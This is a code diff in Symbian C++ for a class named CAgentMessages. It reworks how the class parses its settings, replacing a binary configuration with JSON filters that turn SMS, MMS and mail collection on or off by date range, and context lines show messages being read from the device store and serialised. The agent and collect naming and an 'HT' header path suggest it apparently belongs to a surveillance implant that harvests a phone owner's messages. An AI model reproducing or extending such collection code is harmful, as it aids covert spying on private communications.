@@ -25,12 +25,12 @@
 
 #include <HT\TimeUtils.h>
 
-//#define AGENTCONF_CLASSNAMELEN  32
 
 _LIT(KClassSms,"IPM.SMSText*");
 _LIT(KClassMail,"IPM.Note*");
 _LIT(KClassMms,"IPM.MMS*");
 _LIT(KUs, "Local");
+_LIT(KNullDate, "0000-00-00 00:00:00");
 
 enum TObjectType {
 		EStringFolder           = 0x01000000,
@@ -106,100 +106,108 @@ CAgentMessages* CAgentMessages::NewL(const TDesC8& params)
 	}
 
 
-void CAgentMessages::FillFilter(CMessageFilter* aFilter, const TAgentClassFilterHeader aFilterHeader)
+void CAgentMessages::FillFilter(CMessageFilter* aFilter, const TAgentClassFilter aFilterHeader)
 	{
-	aFilter->iLog = aFilterHeader.bEnabled;
-	aFilter->iSinceFilter = aFilterHeader.bDoFilterFromDate;
-	aFilter->iUntilFilter = aFilterHeader.bDoFilterToDate;
-	aFilter->iMaxMessageSize = aFilterHeader.maxMessageSize;
-	aFilter->iMaxMessageBytesToLog = aFilterHeader.maxMessageSize;
-	if (aFilter->iSinceFilter){
-		TUint64 since = aFilterHeader.fromHigh;
-		since = aFilterHeader.fromHigh;
-		since <<= 32;
-		since += aFilterHeader.fromLow;
-		TTime sinceTTime = TimeUtils::GetSymbianTime(since);
-				
-		aFilter->SetStartDate(sinceTTime);
-	}
-	else {
+	aFilter->iLog = aFilterHeader.iEnabled;
+	aFilter->iSinceFilter = aFilterHeader.iDoFilterFromDate;
+	aFilter->iUntilFilter = aFilterHeader.iDoFilterToDate;
+	if (aFilter->iSinceFilter)
+		{
+		aFilter->SetStartDate(aFilterHeader.iFromDate);
+		}
+	else 
+		{
 		_LIT(KInitialTime,"16010000:000000");
 
 		TTime initialFiletime;
 		initialFiletime.Set(KInitialTime);
-	}
-	if (aFilter->iUntilFilter) {
-		TUint64 until = aFilterHeader.toHigh;
-		until = aFilterHeader.toHigh;
-		until <<= 32;
-		until += aFilterHeader.toLow;
-		//TTime untilTTime = SetSymbianTime(until);
-		TTime untilTTime = TimeUtils::GetSymbianTime(until);
-		aFilter->SetEndDate(untilTTime);
-	}
+		}
+	if (aFilter->iUntilFilter) 
+		{
+		aFilter->SetEndDate(aFilterHeader.iToDate);
+		}
 	}
 
-void CAgentMessages::ParseParameters(void){
-	
-	// TODO: remember to update this code when starting to use keywords!!
-	
-	TUint8* ptr = (TUint8 *)iParams.Ptr(); 		// start of messages agent configuration
-	ptr += sizeof(TUint32);						// start of identification tag
-	ptr += 32;									// start of first prefix filter
-	
-	TInt left = iParams.Size() - 36;   
-	while (left>0)
+void CAgentMessages::GetFilterData(TAgentClassFilter& aFilter, const CJsonObject* aJsonObject)
 	{
-		TUint32 outerLen = 0;   				// length of (second prefix)+header
-		Mem::Copy(&outerLen, ptr, 3);
-		ptr += sizeof(TUint32); 				//start of second prefix filter
-		/*
-		TUint32 innerLen = 0;   
-		Mem::Copy(&innerLen, ptr, 3);
-		*/
-		ptr += sizeof(TUint32); 				// start header
-		TAgentClassFilterHeader filterHeader;
-		Mem::Copy(&filterHeader, ptr, sizeof(filterHeader));
-	
-		TBuf<32> messageClass;
-		messageClass.Copy(filterHeader.MessageClass);
-		
-		if(messageClass.Compare(KClassSms) == 0)
+	aJsonObject->GetBoolL(_L("enabled"),aFilter.iEnabled);
+	if(aFilter.iEnabled)
 		{
-			if(filterHeader.uType == 0)
+		CJsonObject* filterObject;
+		aJsonObject->GetObjectL(_L("filter"),filterObject);
+		//check date "0000-00-00 00:00:00" 
+		TBuf<24> dateFrom;
+		filterObject->GetStringL(_L("datefrom"),dateFrom);
+		if(dateFrom.Compare(KNullDate) == 0)
 			{
-				FillFilter(iSmsRuntimeFilter,filterHeader);
+			aFilter.iDoFilterFromDate = EFalse;
 			}
-			else
+		else
 			{
-				FillFilter(iSmsCollectFilter,filterHeader);
+			aFilter.iDoFilterFromDate = ETrue;
+			aFilter.iFromDate = TimeUtils::GetSymbianDate(dateFrom);
+			}
+		TBuf<24> dateTo;
+		filterObject->GetStringL(_L("dateto"),dateTo);
+		if(dateTo.Compare(KNullDate) == 0)
+			{
+			aFilter.iDoFilterToDate = EFalse;
+			}
+		else
+			{
+			aFilter.iDoFilterToDate = ETrue;
+			aFilter.iToDate = TimeUtils::GetSymbianDate(dateTo);
 			}
 		}
-		else if (messageClass.Compare(KClassMms) == 0)
-		{
-			if(filterHeader.uType == 0)
-			{
-				FillFilter(iMmsRuntimeFilter,filterHeader);
-			}
-			else
-			{
-				FillFilter(iMmsCollectFilter,filterHeader);
-			}
-		} else if (messageClass.Compare(KClassMail) == 0)
-		{
-			if(filterHeader.uType == 0)
-			{
-				FillFilter(iMailRuntimeFilter,filterHeader);
-			}
-			else 
-			{
-				FillFilter(iMailCollectFilter,filterHeader);
-			}
-		}
-		ptr += sizeof(filterHeader);
-		left -= (outerLen+4);   			// +4 because we add the first prefix
 	}
+
+void CAgentMessages::ParseParameters(const TDesC8& aParams)
+	{
 	
+	RBuf paramsBuf;
+			
+	TInt err = paramsBuf.Create(2*aParams.Size());
+	if(err == KErrNone)
+		{
+		paramsBuf.Copy(aParams);
+		}
+	else
+		{
+		//TODO: not enough memory
+		}
+		
+	paramsBuf.CleanupClosePushL();
+    CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
+    CleanupStack::PushL(jsonBuilder);
+	jsonBuilder->BuildFromJsonStringL(paramsBuf);
+	CJsonObject* rootObject;
+	jsonBuilder->GetDocumentObject(rootObject);
+	if(rootObject)
+		{
+		TAgentClassFilter filter;
+		CleanupStack::PushL(rootObject);
+		//get sms data
+		CJsonObject* smsObject;
+		rootObject->GetObjectL(_L("sms"),smsObject);
+		GetFilterData(filter,smsObject);
+		FillFilter(iSmsRuntimeFilter,filter);
+		FillFilter(iSmsCollectFilter,filter);
+		//get mms data
+		CJsonObject* mmsObject;
+		rootObject->GetObjectL(_L("mms"),mmsObject);
+		GetFilterData(filter,mmsObject);
+		FillFilter(iMmsRuntimeFilter,filter);
+		FillFilter(iMmsCollectFilter,filter);
+		//get mail data
+		CJsonObject* mailObject;
+		rootObject->GetObjectL(_L("mail"),mailObject);
+		GetFilterData(filter,mailObject);
+		FillFilter(iMailRuntimeFilter,filter);
+		FillFilter(iMailCollectFilter,filter);
+		CleanupStack::PopAndDestroy(rootObject);
+		}
+	CleanupStack::PopAndDestroy(jsonBuilder);
+	CleanupStack::PopAndDestroy(&paramsBuf);
 }
 
 void CAgentMessages::ConstructL(const TDesC8& params)
@@ -215,7 +223,7 @@ void CAgentMessages::ConstructL(const TDesC8& params)
 	iMailCollectFilter = CMessageFilter::NewL(); 
 	iMailRuntimeFilter = CMessageFilter::NewL();
 		
-	ParseParameters();
+	ParseParameters(params);
 	
 	iLongTask = CLongTaskAO::NewL(*this);
 	iMsvSession = CMsvSession::OpenSyncL(*this); // open the session with the synchronous primitive
@@ -311,7 +319,6 @@ HBufC8* CAgentMessages::GetSMSBufferL(TMsvEntry& aMsvEntryIdx, const TMsvId& aMs
 	serializedMsg.iNumAttachs = 0;
 			
 	// set date in filetime format
-	//TInt64 date = GetFiletime(aMsvEntryIdx.iDate);
 	TInt64 date = TimeUtils::GetFiletime(aMsvEntryIdx.iDate);
 	serializedMsg.iDeliveryTime.dwHighDateTime = (date >> 32);
 	serializedMsg.iDeliveryTime.dwLowDateTime = (date & 0xFFFFFFFF);
@@ -427,7 +434,6 @@ HBufC8* CAgentMessages::GetMMSBufferL(TMsvEntry& aMsvEntryIdx, const TMsvId& aMs
 	serializedMsg.iNumAttachs = 0;
 				
 	// set date in filetime format
-	//TInt64 date = GetFiletime(aMsvEntryIdx.iDate);
 	TInt64 date = TimeUtils::GetFiletime(aMsvEntryIdx.iDate);
 	serializedMsg.iDeliveryTime.dwHighDateTime = (date >> 32);
 	serializedMsg.iDeliveryTime.dwLowDateTime = (date & 0xFFFFFFFF);
